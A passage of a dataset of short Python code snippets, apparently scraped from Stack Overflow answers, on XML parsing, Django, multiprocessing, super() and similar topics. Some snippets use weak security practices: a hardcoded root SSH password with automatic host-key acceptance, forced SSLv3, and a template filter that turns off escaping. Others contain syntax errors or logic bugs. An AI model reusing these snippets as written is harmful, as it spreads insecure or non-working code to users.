</snippet></ROW><ROW><id>11930037</id><snippet>@staticmethod</snippet></ROW><ROW><id>11930037</id><snippet>@staticclass</snippet></ROW><ROW><id>11930037</id><snippet>None</snippet></ROW><ROW><id>11930477</id><snippet>with open("f1") as f1,open("f2") as f2:
    if f1.read().strip() in f2.read():
         print 'found'
</snippet></ROW><ROW><id>11930477</id><snippet>with open("f1") as f1:
    with open("f2") as f2:
       if f1.read().strip() in f2.read():
             print 'found'
</snippet></ROW><ROW><id>11930695</id><snippet>CD</snippet></ROW><ROW><id>11930695</id><snippet>CATALOG</snippet></ROW><ROW><id>11930695</id><snippet>CD</snippet></ROW><ROW><id>11930695</id><snippet>CD</snippet></ROW><ROW><id>11930695</id><snippet>CD</snippet></ROW><ROW><id>11930695</id><snippet>import xml.etree.ElementTree as etree

def get_cd(element):
    try:
        for el in element.iter(tag='CD')
            yield get_cd_info(el)
    except AttributeError:
        # Python &lt; 2.7
        for el in element.getiterator(tag='CD')
            yield get_cd_info(el)

def get_cd_info(element):
    return {'title':element.findtext('TITLE'),
        'artist':element.findtext('ARTIST'),
        'country':element.findtext('COUNTRY'),
        'company':element.findtext('COMPANY'),
        'price':element.findtext('PRICE),
        'year':element.findtext('YEAR')}
</snippet></ROW><ROW><id>11930695</id><snippet>s = '''&lt;CATALOG&gt;
    &lt;CD&gt;
        &lt;TITLE&gt;Empire Burlesque&lt;/TITLE&gt;
        &lt;ARTIST&gt;Bob Dylan&lt;/ARTIST&gt;
        &lt;COUNTRY&gt;USA&lt;/COUNTRY&gt;
        &lt;COMPANY&gt;Columbia&lt;/COMPANY&gt;
        &lt;PRICE&gt;10.90&lt;/PRICE&gt;
        &lt;YEAR&gt;1985&lt;/YEAR&gt;
    &lt;/CD&gt;
    &lt;CD&gt;
        &lt;TITLE&gt;Hide your heart&lt;/TITLE&gt;
        &lt;ARTIST&gt;Bonnie Tyler&lt;/ARTIST&gt;
        &lt;COUNTRY&gt;UK&lt;/COUNTRY&gt;
        &lt;COMPANY&gt;CBS Records&lt;/COMPANY&gt;
        &lt;PRICE&gt;9.90&lt;/PRICE&gt;
        &lt;YEAR&gt;1988&lt;/YEAR&gt;
    &lt;/CD&gt;
&lt;/CATALOG&gt;
'''

e = etree.fromstring(s)

for cd in get_cd(e):
    if cd['country'] == 'USA':
        print('The cd "{0}" is from the USA.'.format(cd['title']))

# prints 'The cd "Empire Burlesque" is from the USA.'
</snippet></ROW><ROW><id>11930769</id><snippet>settings.py</snippet></ROW><ROW><id>11930769</id><snippet>DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql_psycopg2',
        'NAME': 'testdb',
        'USER': 'testdb_user',
        'PASSWORD': 'testdbpassw',
        'HOST': '',
        'PORT': '',
    },
    'fb': {
        'ENGINE': 'firebird',
        'NAME': '/home/idle/mydb.gdb',
        'USER': 'SYSDBA',
        'PASSWORD': 'passw',
        'HOST': '127.0.0.1',
        'PORT': '3050',
        'OPTIONS': {'charset':'WIN1251', 'dialect':1} ,
    }
}
</snippet></ROW><ROW><id>11930873</id><snippet>pip</snippet></ROW><ROW><id>11930873</id><snippet>pip install -I zope.interface==3.8.0
</snippet></ROW><ROW><id>11930873</id><snippet>-I</snippet></ROW><ROW><id>11930873</id><snippet>Classifier: Programming Language :: Python :: *</snippet></ROW><ROW><id>11931020</id><snippet>&gt;&gt;&gt; from time import *
&gt;&gt;&gt; ctime(time())
'Mon Aug 13 16:54:02 2012'
&gt;&gt;&gt; ctime(time()+altzone)
'Mon Aug 13 08:54:04 2012'
</snippet></ROW><ROW><id>11931020</id><snippet>altzone</snippet></ROW><ROW><id>11931020</id><snippet>daylight</snippet></ROW><ROW><id>11931234</id><snippet>functools.partial</snippet></ROW><ROW><id>11931234</id><snippet>map()</snippet></ROW><ROW><id>11931234</id><snippet>from functools import partial
first_word_is_first = map(partial(word_flip, flip=False), g.readlines())
first_word_is_second = map(partial(word_flip, flip=True), g.readlines())
</snippet></ROW><ROW><id>11931234</id><snippet>first_word_is_first = [word_flip(l, flip=False) for l in g.readlines()]
first_word_is_second = [word_flip(l, flip=True) for l in g.readlines()]
</snippet></ROW><ROW><id>11931632</id><snippet>enumerate</snippet></ROW><ROW><id>11931632</id><snippet>indexes = [i for i, val in enumerate(list) if val == '\n']
</snippet></ROW><ROW><id>11931632</id><snippet>&gt;&gt;&gt; lst = ['abc', '\n', 'def', 'ghi', '\n', 'jkl']
&gt;&gt;&gt; [i for i, val in enumerate(lst) if val == '\n']
[1, 4]
</snippet></ROW><ROW><id>11931668</id><snippet>import cv
import cv2
import numpy as np
import numpy.random as r
</snippet></ROW><ROW><id>11931668</id><snippet>samples = cv.CreateMat(50, 2, cv.CV_32FC1)
random_points = r.multivariate_normal((100,100), np.array([[150,400],[150,150]]), size=(25))
random_points_2 = r.multivariate_normal((300,300), np.array([[150,400],[150,150]]), size=(25))   
samples_list = np.append(random_points, random_points_2).reshape(50,2)  
random_points_list = np.array(samples_list, np.float32) 
samples = cv.fromarray(random_points_list)
</snippet></ROW><ROW><id>11931668</id><snippet>blank_image = np.zeros((400,400,3))
blank_image_classified = np.zeros((400,400,3))

for point in random_points_list:
    cv2.circle(blank_image, (int(point[0]),int(point[1])), 1, (0,255,0),-1)

temp, classified_points, means = cv2.kmeans(data=np.asarray(samples), K=2, bestLabels=None,
criteria=(cv2.TERM_CRITERIA_EPS | cv2.TERM_CRITERIA_MAX_ITER, 1, 10), attempts=1, 
flags=cv2.KMEANS_RANDOM_CENTERS)   #Let OpenCV choose random centers for the clusters

for point, allocation in zip(random_points_list, classified_points):
    if allocation == 0:
        color = (255,0,0)
    elif allocation == 1:
        color = (0,0,255)
    cv2.circle(blank_image_classified, (int(point[0]),int(point[1])), 1, color,-1)

cv2.imshow("Points", blank_image)
cv2.imshow("Points Classified", blank_image_classified)
cv2.waitKey()
</snippet></ROW><ROW><id>11931732</id><snippet>"""Convert DICOM files to PNG format, remove blank areas. The blank erea
   removal is based on the image size of a Philips flat detector. The image
   goes from 2048x2048 pixels to 1574x2048 pixels."""

import os
import sys
import subprocess
from multiprocessing import Pool, Lock

globallock = Lock()

def checkfor(args):
    """Make sure that a program necessary for using this script is
    available."""
    if isinstance(args, str):
        args = args.split()
    try:
        f = open('/dev/null')
        subprocess.call(args, stderr=subprocess.STDOUT, stdout=f)
        f.close()
    except:
        print "Required program '{}' not found! exiting.".format(args[0])
        sys.exit(1)

def processfile(fname):
    """Use the convert(1) program from the ImageMagick suite to convert the
       image and crop it."""
    size = '1574x2048'
    args = ['convert', fname, '-units', 'PixelsPerInch', '-density', '300',
            '-crop', size+'+232+0', '-page', size+'+0+0', fname+'.png']
    rv = subprocess.call(args)
    globallock.acquire()
    if rv != 0:
        print "Error '{}' when processing file '{}'.".format(rv, fname)
    else:
        print "File '{}' processed.".format(fname)
    globallock.release()

def main(argv):
    """Main program.

    Keyword arguments:
    argv -- command line arguments
    """
    if len(argv) == 1:
        path, binary = os.path.split(argv[0])
        print "Usage: {} [file ...]".format(binary)
        sys.exit(0)
    checkfor('convert')
    p = Pool()
    p.map(processfile, argv[1:])
    p.close()


## This is the main program ##
if __name__ == '__main__':
    main(sys.argv)
</snippet></ROW><ROW><id>11931845</id><snippet>pip.openplans.org</snippet></ROW><ROW><id>11931845</id><snippet>host pip.openplans.org</snippet></ROW><ROW><id>11931845</id><snippet>host pip.openplans.org 8.8.8.8</snippet></ROW><ROW><id>11931845</id><snippet>host pip.openplans.org 8.8.4.4</snippet></ROW><ROW><id>11931845</id><snippet>dscacheutil -flushcache</snippet></ROW><ROW><id>11932141</id><snippet>super</snippet></ROW><ROW><id>11932141</id><snippet>**kwargs</snippet></ROW><ROW><id>11932141</id><snippet>object</snippet></ROW><ROW><id>11932141</id><snippet>class Actor(object):    # in Python 3, class Actor:
    _world = None
    def __init__(self, world):
        self._world = world

class Mover(Actor):
    _speed = 0
    def __init__(self, speed, **kwargs):
        super(Mover, self).__init__(**kwargs)    # in Python 3, super().__init__(**kwargs)
        self._speed = speed

class Attacker(Actor):
    _range = 0
    def __init__(self, range, **kwargs):
        super(Attacker, self).__init__(**kwargs) # in Python 3, super().__init__(**kwargs)
        self._range = range

class Human(Mover, Attacker):
    def __init__(self, **kwargs):
        super(Human, self).__init__(**kwargs)    # in Python 3, super().__init__(**kwargs)
</snippet></ROW><ROW><id>11932141</id><snippet>Human</snippet></ROW><ROW><id>11932141</id><snippet>human = Human(world=world, range=range, speed=speed)
</snippet></ROW><ROW><id>11932141</id><snippet>__init__</snippet></ROW><ROW><id>11932141</id><snippet>A, B, C, D</snippet></ROW><ROW><id>11932141</id><snippet>D.__init__</snippet></ROW><ROW><id>11932141</id><snippet>B.__init__</snippet></ROW><ROW><id>11932141</id><snippet>B.__init__</snippet></ROW><ROW><id>11932141</id><snippet>C.__init__</snippet></ROW><ROW><id>11932141</id><snippet>C.__init__</snippet></ROW><ROW><id>11932141</id><snippet>A.__init__</snippet></ROW><ROW><id>11932141</id><snippet>A.__init__</snippet></ROW><ROW><id>11932141</id><snippet>object.__init__</snippet></ROW><ROW><id>11932141</id><snippet>super(B, self)</snippet></ROW><ROW><id>11932141</id><snippet>D</snippet></ROW><ROW><id>11932141</id><snippet>C</snippet></ROW><ROW><id>11932141</id><snippet>C</snippet></ROW><ROW><id>11932141</id><snippet>A</snippet></ROW><ROW><id>11932141</id><snippet>&gt;&gt;&gt; D.__mro__
(&lt;class '__main__.D'&gt;, &lt;class '__main__.B'&gt;, &lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;type 'object'&gt;)
</snippet></ROW><ROW><id>11932141</id><snippet>super</snippet></ROW><ROW><id>11932141</id><snippet>super(cls, obj)</snippet></ROW><ROW><id>11932141</id><snippet>__getattribute__</snippet></ROW><ROW><id>11932141</id><snippet>def super(cls, obj):
    mro = type(obj).__mro__
    parent = mro[mro.index(cls) + 1]
    class proxy(object):
        def __getattribute__(self, name):
            return getattr(parent, name).__get__(obj)
    return proxy()
</snippet></ROW><ROW><id>11932151</id><snippet>related_name='+'</snippet></ROW><ROW><id>11932151</id><snippet>class GroupUpload</snippet></ROW><ROW><id>11932295</id><snippet>pt1 = (10, 20)
pt2 = (100, 200)
# calculate top left corner coords, width, height
min_x = min(pt1[0], pt2[0]) # left
min_y = min(pt1[1], pt2[1]) # top
width = max(pt1[0], pt2[0])-min_x
height = max(pt1[1], pt2[1])-min_y
# draw rectangle 
dc.DrawRectangle(min_x, min_y, width, height)
</snippet></ROW><ROW><id>11932494</id><snippet>set</snippet></ROW><ROW><id>11932494</id><snippet>seen = set()
{k: v for k, v in yourdict.iteritems() 
    if v['name'] not in seen and (seen.add(v['name']) or True)}
</snippet></ROW><ROW><id>11932494</id><snippet>seen = set()
filtered = dict()
for k, v in yourdict.iteritems():
    if v['name'] in seen:
        continue
    seen.add(v['name'])
    filtered[k] = v
</snippet></ROW><ROW><id>11932758</id><snippet>1) Sample.objects(somedict__someinfo__name='Jordan')
2) Sample.objects(somedict__someinfo__food='Fries')
</snippet></ROW><ROW><id>11932981</id><snippet>sorted(a_dict.items(), key=lambda (k, (v1, v2)): v2)
sorted(a_dict.items(), key=lambda item: item[1][1])    # Python 3
</snippet></ROW><ROW><id>11932981</id><snippet>collections.OrderedDict</snippet></ROW><ROW><id>11932981</id><snippet>OrderedDict(sorted(a_dict.items(), key=lambda (k, (v1, v2)): v2))
OrderedDict(sorted(a_dict.items(), key=lambda item: item[1][1])    # Python 3
</snippet></ROW><ROW><id>11933851</id><snippet>{{ string }}</snippet></ROW><ROW><id>11933851</id><snippet>|safe</snippet></ROW><ROW><id>11933851</id><snippet>{{ string|safe }}</snippet></ROW><ROW><id>11933902</id><snippet>__all__</snippet></ROW><ROW><id>11934332</id><snippet>im_class</snippet></ROW><ROW><id>11934332</id><snippet>inspect.getmembers(Bar,
    lambda m: inspect.ismethod(m) and m.__func__ in m.im_class.__dict__.values())
</snippet></ROW><ROW><id>11934332</id><snippet>[
    ('__init__', &lt;unbound method Bar.__init__&gt;),
    ('f1', &lt;unbound method Bar.f1&gt;), 
    ('f2', &lt;unbound method Bar.f2&gt;)
]
</snippet></ROW><ROW><id>11934332</id><snippet>getmembers</snippet></ROW><ROW><id>11934332</id><snippet>[m for m in Bar.__dict__.values() if inspect.isfunction(m)]
</snippet></ROW><ROW><id>11934332</id><snippet>[&lt;function __init__ at 0x100a28de8&gt;, &lt;function g1 at 0x100a28e60&gt;, &lt;function g2 at 0x100a28ed8&gt;]
</snippet></ROW><ROW><id>11934332</id><snippet>.__func__</snippet></ROW><ROW><id>11934332</id><snippet>im_func</snippet></ROW><ROW><id>11934332</id><snippet>.__self__</snippet></ROW><ROW><id>11934446</id><snippet>im=Image.open(p1.photo)
im_resize = im.resize((400, 400), Image.ANTIALIAS)    # best down-sizing filter
im.save(str(merchant.id)+'_logo.'+'png')
</snippet></ROW><ROW><id>11934446</id><snippet>im_resize.save(str(merchant.id)+'_logo.'+'png')
</snippet></ROW><ROW><id>11934483</id><snippet>[ x for y in range(3) for x in range(y) ]
</snippet></ROW><ROW><id>11934483</id><snippet>for y in range(3):
    for x in range(y):
        x
</snippet></ROW><ROW><id>11934483</id><snippet>for</snippet></ROW><ROW><id>11934483</id><snippet>for</snippet></ROW><ROW><id>11934483</id><snippet>if</snippet></ROW><ROW><id>11934483</id><snippet>for</snippet></ROW><ROW><id>11934483</id><snippet>if</snippet></ROW><ROW><id>11934483</id><snippet>()</snippet></ROW><ROW><id>11934483</id><snippet>&gt;&gt;&gt; (x for y in range(3) for x in range(y))
&lt;generator object &lt;genexpr&gt; at 0x100b50410&gt;
&gt;&gt;&gt; [x for y in range(3) for x in range(y)]
[0, 0, 1]
</snippet></ROW><ROW><id>11934565</id><snippet>def traverse(dic, path=None):
    if not path:
        path = []
    for i in dic:
        local_path = path[:].append(i)
        if i['type'] == 'folder':
            for j in traverse(i['children'], local_path):
                yield j, local_path
        elif i['type'] == 'url':
            yield i, local_path
</snippet></ROW><ROW><id>11934669</id><snippet>import urllib.request
import urllib.parse
params = urllib.parse.urlencode({'Lang': 'en', 'login': 'blafoo', 'passwd': 'foobla'})
f = urllib.request.urlopen("http://x.x.x.x/index.cst?%s" % params)
f.read()
</snippet></ROW><ROW><id>11935220</id><snippet>m = re.match(r"(?:[^euioa]|[euioa](?![euioa]))*$", word)
</snippet></ROW><ROW><id>11935220</id><snippet>if not m</snippet></ROW><ROW><id>11935220</id><snippet>if m</snippet></ROW><ROW><id>11936027</id><snippet>client</snippet></ROW><ROW><id>11936027</id><snippet>get_sftp</snippet></ROW><ROW><id>11936027</id><snippet>import paramiko

def get_sftp():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('localhost', username='root', password='B4nan-purr(en)')
    return client

def test2():
    client = get_sftp()
    sftp = client.open_sftp()
    sftp.stat('/tmp')
    sftp.close()


if __name__ == "__main__":
    test2()
</snippet></ROW><ROW><id>11936095</id><snippet>&lt;img tal:define="scales context/@@images;
                 thumbnail python: scales.scale('image', width=64, height=64);"
     tal:condition="thumbnail"
     tal:attributes="src thumbnail/url;
                     width thumbnail/width;
                     height thumbnail/height" /&gt;
</snippet></ROW><ROW><id>11936209</id><snippet> import ssl
 https_sslv3_handler = urllib.request.HTTPSHandler(context=ssl.SSLContext(ssl.PROTOCOL_SSLv3))
 opener = urllib.request.build_opener(https_sslv3_handler)
 urllib.request.install_opener(opener)
</snippet></ROW><ROW><id>11936383</id><snippet>struct</snippet></ROW><ROW><id>11936608</id><snippet>def get_random_image(self):
    for rand in func.random, func.rand:
        try:                                                           
            return self.images.order_by(rand()).limit(1)
        except ProgrammingError:                                                        
            pass
    raise ProgrammingError('This database engine is not supported')
</snippet></ROW><ROW><id>11937041</id><snippet>for line in my_text:
    outputfile.writelines(data_parser(line, reps))
</snippet></ROW><ROW><id>11937041</id><snippet>inputfile = open('test.dat')
outputfile = open('test.csv', 'w')

# sample text string, just for demonstration to let you know how the data looks like
# my_text = '"2012-06-23 03:09:13.23",4323584,-1.911224,-0.4657288,-0.1166382,-0.24823,0.256485,"NAN",-0.3489428,-0.130449,-0.2440527,-0.2942413,0.04944348,0.4337797,-1.105218,-1.201882,-0.5962594,-0.586636'

# dictionary definition 0-, 1- etc. are there to parse the date block delimited with dashes, and make sure the negative numbers are not effected
reps = {'"NAN"':'NAN', '"':'', '0-':'0,','1-':'1,','2-':'2,','3-':'3,','4-':'4,','5-':'5,','6-':'6,','7-':'7,','8-':'8,','9-':'9,', ' ':',', ':':',' }

for i in range(4): inputfile.next() # skip first four lines
for line in inputfile:
    outputfile.writelines(data_parser(line, reps))

inputfile.close()
outputfile.close()
</snippet></ROW><ROW><id>11937063</id><snippet>python setting.py
</snippet></ROW><ROW><id>11937063</id><snippet>app/</snippet></ROW><ROW><id>11937063</id><snippet>current working directory</snippet></ROW><ROW><id>11937063</id><snippet>sys.path</snippet></ROW><ROW><id>11937063</id><snippet>site-packages</snippet></ROW><ROW><id>11937063</id><snippet>dist-packages</snippet></ROW><ROW><id>11937063</id><snippet>current working directory</snippet></ROW><ROW><id>11937063</id><snippet>lib</snippet></ROW><ROW><id>11937063</id><snippet>sys.path</snippet></ROW><ROW><id>11937063</id><snippet>app</snippet></ROW><ROW><id>11937063</id><snippet>lib</snippet></ROW><ROW><id>11937063</id><snippet>settings.py</snippet></ROW><ROW><id>11937063</id><snippet>PYTHONPATH="../lib" python ./settings.py
</snippet></ROW><ROW><id>11937063</id><snippet>lib</snippet></ROW><ROW><id>11937063</id><snippet>lib</snippet></ROW><ROW><id>11937063</id><snippet>app/</snippet></ROW><ROW><id>11937069</id><snippet>unittest</snippet></ROW><ROW><id>11937069</id><snippet>% python -m unittest -h
Usage: python -m unittest [options] [tests]

Options:
  -h, --help       Show this message
  -v, --verbose    Verbose output
  -q, --quiet      Minimal output
  -f, --failfast   Stop on first failure
  -c, --catch      Catch control-C and display results
  -b, --buffer     Buffer stdout and stderr during test runs

Examples:
  python -m unittest test_module               - run tests from test_module
  python -m unittest module.TestClass          - run tests from module.TestClass
  python -m unittest module.Class.test_method  - run specified test method

[tests] can be a list of any number of test modules, classes and test
methods.

Alternative Usage: python -m unittest discover [options]

Options:
  -v, --verbose    Verbose output
  -f, --failfast   Stop on first failure
  -c, --catch      Catch control-C and display results
  -b, --buffer     Buffer stdout and stderr during test runs
  -s directory     Directory to start discovery ('.' default)
  -p pattern       Pattern to match test files ('test*.py' default)
  -t directory     Top level directory of project (default to
                   start directory)

For test discovery all test modules must be importable from the top
level directory of the project.
</snippet></ROW><ROW><id>11937319</id><snippet>os.chdir</snippet></ROW><ROW><id>11937319</id><snippet>Exception</snippet></ROW><ROW><id>11937319</id><snippet>java.lang.Exception</snippet></ROW><ROW><id>11937907</id><snippet>len(obj.your_field)</snippet></ROW><ROW><id>11937907</id><snippet>from django.db import models

class Person(models.Model):
    first_name = models.CharField(max_length=30)
    last_name = models.CharField(max_length=30)

 person = Person.objects.get(pk=1)

 len(person.first_name)
</snippet></ROW><ROW><id>11938197</id><snippet>#First we need to access the module that lets us connect to Excel
import win32com.client 

# Next we want to create a variable that represents Excel
app = win32com.client.Dispatch("Excel.Application")   

# Lastly we will assume that the sheet with the names is the active sheet
sheet = app.ActiveSheet
</snippet></ROW><ROW><id>11938197</id><snippet>import win32com.client
app = win32com.client.Dispatch("Excel.Application")   
sheet = app.ActiveSheet

# rang is an object representing the cells A1, A2, A3
rang = sheet.Range("A1","A3")

# names is a tuple of length 3 containing tuples of length 2
names = rang.Value

#nameLst is a list of all values in names
nameLst = [name[0] for name in names]
</snippet></ROW><ROW><id>11938197</id><snippet>import win32com.client
app = win32com.client.Dispatch("Excel.Application")   
sheet = app.ActiveSheet

rang = sheet.Range("A1","A3")
names = rang.Value
nameLst = [name[0] for name in names]

#Iterate over the rows ic ColB. Remember Excel uses base 1 not 0 for inexing
for rowI in range(1,3):
    cellNames = sheet.Cells(rowI,2).Value

    #split cellNames by "," and add all of the names to a list.
    cellNamesLst = [cellName.strip() for cellName in cellNames.split(",")]

    #Now we want a list of all names that are in cellNamesLst and in nameLst
    matchLst = [matchName for matchName in cellNamesLst if matchName in nameLst]

    #Create a string of all matches to go in Col C
    allMatches = ", ".join(matchLst)

    #Lastly put all matches in in Col C
    sheet.Cells(rowI,3).Value = allMatches
</snippet></ROW><ROW><id>11938197</id><snippet>import win32com.client
app = win32com.client.Dispatch("Excel.Application")   
sheet = app.ActiveSheet

rang = sheet.Range("A1","A3")
names = rang.Value
nameLst = [name[0] for name in names]

for rowI in range(1,3):
    cellNames = sheet.Cells(rowI,2).Value
    cellNamesLst = [cellName.strip() for cellName in cellNames.split(",")]
    matchLst = [matchName for matchName in cellNamesLst if matchName in nameLst]
    allMatches = ", ".join(matchLst)
    sheet.Cells(rowI,3).Value = allMatches
</snippet></ROW><ROW><id>11938355</id><snippet>CFLAGS</snippet></ROW><ROW><id>11938355</id><snippet>Tweaking compiler/linker flags</snippet></ROW><ROW><id>11938546</id><snippet>'abc'</snippet></ROW><ROW><id>11938546</id><snippet>monitor.urls</snippet></ROW><ROW><id>11938546</id><snippet>reverse</snippet></ROW><ROW><id>11938546</id><snippet>abc/</snippet></ROW><ROW><id>11938546</id><snippet>reverse</snippet></ROW><ROW><id>11938546</id><snippet>reverse</snippet></ROW><ROW><id>11938546</id><snippet>abc</snippet></ROW><ROW><id>11938546</id><snippet>id</snippet></ROW><ROW><id>11938546</id><snippet>abc</snippet></ROW><ROW><id>11938546</id><snippet>redirect("abc", id=...)
</snippet></ROW><ROW><id>11938546</id><snippet>...</snippet></ROW><ROW><id>11938546</id><snippet>id</snippet></ROW><ROW><id>11938546</id><snippet>abc</snippet></ROW><ROW><id>11938546</id><snippet>monitors.urls</snippet></ROW><ROW><id>11938546</id><snippet>monitor/</snippet></ROW><ROW><id>11938646</id><snippet>&gt;&gt;&gt; s = "\x00\x12\xf8\x05\x74\xa2"
&gt;&gt;&gt; [ord(x) for x in list(s)]
[0, 18, 248, 5, 116, 162]
</snippet></ROW><ROW><id>11938787</id><snippet>import multiprocessing
import logging

def g1(results, x):
    y = x*x
    print "processing: y = %s" % y
    results.append(y)

def f1():
    logger = multiprocessing.log_to_stderr()
    logger.setLevel(multiprocessing.SUBDEBUG)
    manager = multiprocessing.Manager()
    results = manager.list()
    pool = multiprocessing.Pool(processes=4)
    for (i) in range(0,15):
        pool.apply_async(g1, [results, i])
    pool.close()
    pool.join()


def main():
    f1()

if __name__ == "__main__":
    main()
</snippet></ROW><ROW><id>11938818</id><snippet>.so</snippet></ROW><ROW><id>11939024</id><snippet>toSend = []
toSendLength = 0
for row in rows:
    tentativeLength = len(json.dumps(row))
    if tentativeLength &gt; bytesPerMB:
        parsingBehavior // do something about lolhuge files
    elif toSendLength + tentativeLength &gt; bytesPerMB: // it would be too large
        sendToServer(json.dumps(toSend)) // don't exceed limit; send now
        toSend = [row] // refresh for next round - and we know it fits!
        toSendLength = tentativeLength
    else: // otherwise, it wont be too long, so add it in
        toSend.append(row)
        toSendLength += tentative
sentToServer(json.dumps(toSend)) // if it finishes below the limit
</snippet></ROW><ROW><id>11939029</id><snippet>pip install -e /path/to/package</snippet></ROW><ROW><id>11939224</id><snippet>etree.HTML()</snippet></ROW><ROW><id>11939224</id><snippet>&lt;meta http-equiv="Content-Type" content="text/html; charset=EUC-JP"/&gt;
</snippet></ROW><ROW><id>11939224</id><snippet>utf-8</snippet></ROW><ROW><id>11939224</id><snippet>EUC-JP</snippet></ROW><ROW><id>11939224</id><snippet>utf-8</snippet></ROW><ROW><id>11939224</id><snippet>&gt;&gt;&gt; myparser = etree.HTMLParser(encoding="utf-8")
&gt;&gt;&gt; tree = etree.HTML(htmltext, parser=myparser)
</snippet></ROW><ROW><id>11939238</id><snippet>new_data = {k: v for k, v in data.iteritems() if v[0] &lt;= 30}
</snippet></ROW><ROW><id>11939238</id><snippet>items()</snippet></ROW><ROW><id>11939238</id><snippet>iteritems()</snippet></ROW><ROW><id>11939238</id><snippet>for</snippet></ROW><ROW><id>11939238</id><snippet>for k, v in data.items():
    if v[0] &gt; 30:
        del data[k]
</snippet></ROW><ROW><id>11939238</id><snippet>list(data.items())</snippet></ROW><ROW><id>11939238</id><snippet>data.items()</snippet></ROW><ROW><id>11939257</id><snippet>from django.contrib.auth.models import User

class EmailOrUsernameModelBackend(object):
    def authenticate(self, username=None, password=None):
        if '@' in username:
            kwargs = {'email': username}
        else:
            kwargs = {'username': username}
        try:
            user = User.objects.get(**kwargs)
            if user.check_password(password):
                return user
        except User.DoesNotExist:
            return None

    def get_user(self, user_id):
        try:
            return User.objects.get(pk=user_id)
        except User.DoesNotExist:
            return None
</snippet></ROW><ROW><id>11939257</id><snippet>AUTHENTICATION_BACKENDS = (
    'myoursite.backends.EmailOrUsernameBackend', # Custom Authentication to accept usernamee or email
)
</snippet></ROW><ROW><id>11939436</id><snippet>import os

searchdir = r'C:\root_dir' # traversal starts in this directory (the root) 

for root, dirs, files in os.walk(searchdir):
    for name in files:
        (base, ext) = os.path.splitext(name) # split base and extension
        print base, ext
</snippet></ROW><ROW><id>11939499</id><snippet>obj.func1</snippet></ROW><ROW><id>11939499</id><snippet>self</snippet></ROW><ROW><id>11939499</id><snippet>staticmethod</snippet></ROW><ROW><id>11939544</id><snippet>from pyfpdf import FPDF

pdf=FPDF()
pdf.add_page()
pdf.set_font('Courier','B',16)
pdf.cell(40,10,'Hello World!')
pdf.output('tuto1.pdf','F')
</snippet></ROW><ROW><id>11939582</id><snippet>\u0163</snippet></ROW><ROW><id>11939582</id><snippet>#!/usr/bin/env python3
import json

# json produces a subset of yaml
print(json.dumps('pe toţi mai')) # -&gt; "pe to\u0163i mai"
print(json.dumps('pe toţi mai', ensure_ascii=False)) # -&gt; "pe toţi mai"
</snippet></ROW><ROW><id>11939582</id><snippet>\u</snippet></ROW><ROW><id>11939582</id><snippet>yaml.dump()</snippet></ROW><ROW><id>11939582</id><snippet>allow_unicode</snippet></ROW><ROW><id>11939582</id><snippet>True</snippet></ROW><ROW><id>11939582</id><snippet>#!/usr/bin/env python3
from urllib.parse import unquote

url =  "pe%20to%C5%A3i%20mai"
text = unquote(url)

with open('some_file', 'w', encoding='utf-8') as file:
    def p(line):
        print(line, file=file) # write line to file

    p(text)                # -&gt; pe toţi mai
    p(repr(text))          # -&gt; 'pe toţi mai'
    p(ascii(text))         # -&gt; 'pe to\u0163i mai'

    p("pe to\u0163i mai")  # -&gt; pe toţi mai
    p(r"pe to\u0163i mai") # -&gt; pe to\u0163i mai
    #NOTE: r'' prefix
</snippet></ROW><ROW><id>11939582</id><snippet>\u0163</snippet></ROW><ROW><id>11939582</id><snippet>with open('some_other_file', 'wb') as file: # write bytes
    file.write(text.encode('ascii', 'backslashreplace')) # -&gt; pe to\u0163i mai
</snippet></ROW><ROW><id>11939582</id><snippet>with open('another', 'w', encoding='ascii', errors='backslashreplace') as file:
    file.write(text) # -&gt; pe to\u0163i mai
</snippet></ROW><ROW><id>11939582</id><snippet># introduce some more \u escapes
b = r"pe to\u0163i mai ţţţ".encode('ascii', 'backslashreplace') # bytes
print(b.decode('ascii')) # -&gt; pe to\u0163i mai \u0163\u0163\u0163
# remove unicode escapes
print(b.decode('unicode-escape')) # -&gt; pe toţi mai ţţţ
</snippet></ROW><ROW><id>11939683</id><snippet>&gt;&gt;&gt; x = [[1, 2], [3, 4], [5, 6]]
&gt;&gt;&gt; x
[[1, 2], [3, 4], [5, 6]]
&gt;&gt;&gt; x.append([10, 20])
&gt;&gt;&gt; x
[[1, 2], [3, 4], [5, 6], [10, 20]]
</snippet></ROW><ROW><id>11939683</id><snippet>&gt;&gt;&gt; x = [[1, 2], [3, 4], [5, 6]]
&gt;&gt;&gt; x
[[1, 2], [3, 4], [5, 6]]
&gt;&gt;&gt; x += [[10, 20]] # a list with a list as its only element
&gt;&gt;&gt; x
[[1, 2], [3, 4], [5, 6], [10, 20]]
</snippet></ROW><ROW><id>11939745</id><snippet>multi_values</snippet></ROW><ROW><id>11939745</id><snippet>def example(var1=None, var2=None, var3=None, multi_values=None):
    if multi_values is None:
        multi_values = []
    # whatever
</snippet></ROW><ROW><id>11939745</id><snippet>example(multi_values=multi)
</snippet></ROW><ROW><id>11939745</id><snippet>var1</snippet></ROW><ROW><id>11939745</id><snippet>var3</snippet></ROW><ROW><id>11939745</id><snippet>def example(*multi_values, **kwargs):
    var1 = kwargs.pop("var1", None)
    var2 = kwargs.pop("var2", None)
    var3 = kwargs.pop("var3", None)
    if kwargs:
        raise TypeError("Unknown keyword arguments")
    # whatever
</snippet></ROW><ROW><id>11939745</id><snippet>var1</snippet></ROW><ROW><id>11939745</id><snippet>var3</snippet></ROW><ROW><id>11939745</id><snippet>*multi_values</snippet></ROW><ROW><id>11939745</id><snippet>def example(*multi_values, var1=None, var2=None, var3=None):
    # whatever
</snippet></ROW><ROW><id>11940089</id><snippet>()</snippet></ROW><ROW><id>11940089</id><snippet>[]</snippet></ROW><ROW><id>11940089</id><snippet>raise</snippet></ROW><ROW><id>11940089</id><snippet>raise forms.ValidationError("Please enter a valid Penn Email Address")
</snippet></ROW><ROW><id>11940493</id><snippet>remember_unique_id</snippet></ROW><ROW><id>11940493</id><snippet>call_after_request_callbacks</snippet></ROW><ROW><id>11940493</id><snippet>after_this_request</snippet></ROW><ROW><id>11940493</id><snippet>result</snippet></ROW><ROW><id>11940493</id><snippet># This
for callback in getattr(g, 'after_request_callbacks', ()):
    response = callback(response)

# translates to this
for callback in [remember_unique_id]:
    response = callback(response)

# which translates to this
response = remember_unique_id(response)

# which translates to this
response = None
